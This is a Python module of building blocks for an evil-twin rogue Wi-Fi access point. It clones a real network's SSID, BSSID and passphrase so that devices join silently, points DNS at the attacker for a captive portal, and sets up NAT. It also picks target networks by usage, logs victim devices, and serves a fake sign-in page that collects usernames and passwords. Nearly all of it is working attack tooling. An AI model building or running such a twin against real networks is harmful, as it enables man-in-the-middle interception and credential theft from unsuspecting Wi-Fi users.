"""Rogue-AP building blocks: hostapd/dnsmasq configs, NAT, stations, portal.

The old ``capture.eviltwin_config`` wrote two configs with ``interface=wlan0``
hardcoded and stopped there. A twin that actually works needs more:

* an **open** twin asks the victim to notice and join; a **WPA clone** — the
  real SSID *and* the real PSK — joins silently, which is the difference
  between a decoy and a man in the middle;
* clients only stay if DHCP, DNS and (optionally) NAT to a real uplink exist,
  otherwise the captive portal never finishes loading;
* the twin has to survive the client preferring the real AP, which means
  cloning its BSSID and kicking it continuously;
* and it has to record what happens: stations, DNS, portal posts.

Everything here is a pure string/argv builder so it is testable without a
radio; the module is what spawns processes.
"""

from __future__ import annotations

import re

__all__ = ["slug", "hostapd_conf", "dnsmasq_conf", "nat_rules", "nat_cleanup",
           "parse_stations", "portal_page", "choose_target", "default_uplink",
           "AP_IP", "POOL", "USER_FIELDS", "PASS_FIELDS", "TWIN_ORDER"]

#: address the twin hands out as gateway/DNS (the attacker box on that link)
AP_IP = "10.0.0.1"
POOL = "10.0.0.10,10.0.0.250,12h"

#: form field names the portal accepts, in the order it prefers them
USER_FIELDS = ("username", "user", "email", "login", "identity")
PASS_FIELDS = ("password", "pass", "passwd", "pwd")

#: security labels worth cloning, best first — a WPA3-only AP is a poor twin
#: (clients expect SAE) and a hidden SSID gives the portal nothing to show
TWIN_ORDER = ("WPA2", "WPA", "OPEN", "WEP", "WPA3")



def slug(text: str) -> str:
    """Filesystem-safe fragment of an SSID."""
    return re.sub(r"[^A-Za-z0-9._-]+", "_", text or "ssid").strip("_") or "ssid"


def hostapd_conf(iface: str, ssid: str, channel: int = 6,
                 bssid: str | None = None, psk: str | None = None,
                 hidden: bool = False, pmf: bool = False) -> str:
    """hostapd config for the twin.

    With ``psk`` the twin is WPA2-PSK, i.e. a clone of the real network; without
    it the twin is open, the fallback when the key is unknown.
    """
    lines = [
        "driver=nl80211",
        f"interface={iface}",
        f"ssid={ssid}",
        f"hw_mode={'a' if int(channel) > 14 else 'g'}",
        f"channel={int(channel)}",
        "auth_algs=1",
        "wmm_enabled=1",
        "beacon_int=100",
        "dtim_period=2",
        "ieee80211n=1",
    ]
    if hidden:
        lines.append("ignore_broadcast_ssid=1")
    if bssid:
        # clone the real radio address so a client sees no difference
        lines += [f"bssid={bssid.lower()}", "macaddr_acl=0"]
    if psk:
        lines += [
            "wpa=2",
            "wpa_key_mgmt=WPA-PSK",
            f"wpa_passphrase={psk}",
            "wpa_pairwise=CCMP",
            "rsn_pairwise=CCMP",
        ]
        if pmf:
            lines.append("ieee80211w=1")
    else:
        lines.append("wpa=0")
    return "\n".join(lines) + "\n"


def dnsmasq_conf(iface: str, ap_ip: str = AP_IP, pool: str = POOL,
                 upstream: str | None = None, portal: bool = False,
                 log_path: str | None = None) -> str:
    """dnsmasq config: DHCP for victims, DNS that either lies or forwards.

    ``portal`` points every name at the tunnel address (``address=/#/…``), which
    is what makes a captive portal appear; otherwise DNS is forwarded so a NATed
    client keeps working internet.
    """
    lines = [
        f"interface={iface}",
        "bind-interfaces",
        "except-interface=lo",
        f"dhcp-range={pool}",
        f"dhcp-option=3,{ap_ip}",
        f"dhcp-option=6,{ap_ip}",
        "domain-needed",
        "bogus-priv",
        "no-resolv",
        "log-queries",
        "log-dhcp",
    ]
    if portal:
        lines += [f"address=/#/{ap_ip}", f"address=/localhost/{ap_ip}"]
    elif upstream:
        lines.append(f"server={upstream}")
    else:
        lines += ["server=1.1.1.1", "server=8.8.8.8"]
    if log_path:
        lines.append(f"log-facility={log_path}")
    return "\n".join(lines) + "\n"


def nat_rules(uplink: str, ap_iface: str, ap_ip: str = AP_IP) -> list[list[str]]:
    """iptables argv list that routes victims out through ``uplink``."""
    return [
        ["sysctl", "-q", "-w", "net.ipv4.ip_forward=1"],
        ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", uplink,
         "-j", "MASQUERADE"],
        ["iptables", "-A", "FORWARD", "-i", ap_iface, "-o", uplink,
         "-j", "ACCEPT"],
        ["iptables", "-A", "FORWARD", "-i", uplink, "-o", ap_iface,
         "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    ]


def nat_cleanup(uplink: str, ap_iface: str, ap_ip: str = AP_IP) -> list[list[str]]:
    """The matching ``-D`` operations, so a run leaves no rules behind."""
    return [["-D" if a == "-A" else a for a in argv]
            for argv in reversed(nat_rules(uplink, ap_iface, ap_ip))
            if argv[0] == "iptables"]


def parse_stations(text: str) -> list[str]:
    """Client MACs from ``iw dev <if> station dump`` or hostapd log lines."""
    return sorted({m.group(1).upper() for m in re.finditer(
        r"\b([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\b", text or "")})


def choose_target(aps: list[dict]) -> dict | None:
    """The AP worth cloning: joinable, named, strongest, WPA2 if possible.

    Ranking is deliberate — a hidden SSID leaves the portal with nothing to
    show, WPA3-only clients expect SAE, and a weak AP nobody uses is not worth
    kicking. A twin needs a network that people are *on*.
    """
    usable = [ap for ap in aps if ap.get("ssid") and ap.get("channel")]
    if not usable:
        return None

    def rank(ap: dict) -> tuple[int, float]:
        security = str(ap.get("security") or "OPEN").upper()
        place = next((i for i, name in enumerate(TWIN_ORDER) if name in security),
                     len(TWIN_ORDER))
        return place, -(ap.get("signal") or -999)

    best = sorted(usable, key=rank)[0]
    return {"ssid": best["ssid"], "bssid": (best.get("bssid") or "").lower(),
            "channel": int(best["channel"]),
            "security": best.get("security") or "OPEN",
            "signal": best.get("signal")}


def default_uplink(routes: str, skip: tuple[str, ...] = ()) -> str:
    """The interface carrying the default route, from ``ip route show default``.

    ``skip`` names interfaces that must not be chosen — the twin's own AP
    interface never has the real route, but a caller may pass it anyway.
    """
    for line in (routes or "").splitlines():
        if not line.strip().startswith("default"):
            continue
        match = re.search(r"\bdev\s+(\S+)", line)
        if match and match.group(1) not in skip:
            return match.group(1)
    return ""


def portal_page(title: str = "Wi-Fi", note: str = "") -> str:
    """Built-in captive portal: one form, one POST, no JavaScript needed."""
    note_html = f"<p class='note'>{note}</p>" if note else ""
    return f"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title} — sign in</title>
<style>
 body{{font-family:-apple-system,Segoe UI,Roboto,sans-serif;margin:0;
      background:#0f1115;color:#e8eaed;display:flex;min-height:100vh;
      align-items:center;justify-content:center}}
 .card{{background:#181b21;padding:28px;border-radius:14px;width:min(92vw,360px);
      box-shadow:0 10px 40px #0008}}
 h1{{font-size:19px;margin:0 0 6px}} p{{color:#9aa0a6;font-size:14px}}
 .note{{color:#c8ccd1}} label{{display:block;font-size:13px;margin:14px 0 6px}}
 input{{width:100%;padding:11px;border-radius:9px;border:1px solid #2c313a;
      background:#0f1115;color:#e8eaed;font-size:15px;box-sizing:border-box}}
 button{{margin-top:18px;width:100%;padding:12px;border:0;border-radius:9px;
      background:#4285f4;color:#fff;font-size:15px;font-weight:600}}
</style></head><body><div class="card">
<h1>{title}</h1>
<p>This network requires a sign-in to reach the internet.</p>{note_html}
<form method="post" action="/login">
 <label for="u">Email or user</label>
 <input id="u" name="username" autocomplete="username" required>
 <label for="p">Password</label>
 <input id="p" name="password" type="password" autocomplete="current-password" required>
 <button type="submit">Continue</button>
</form></div></body></html>
"""
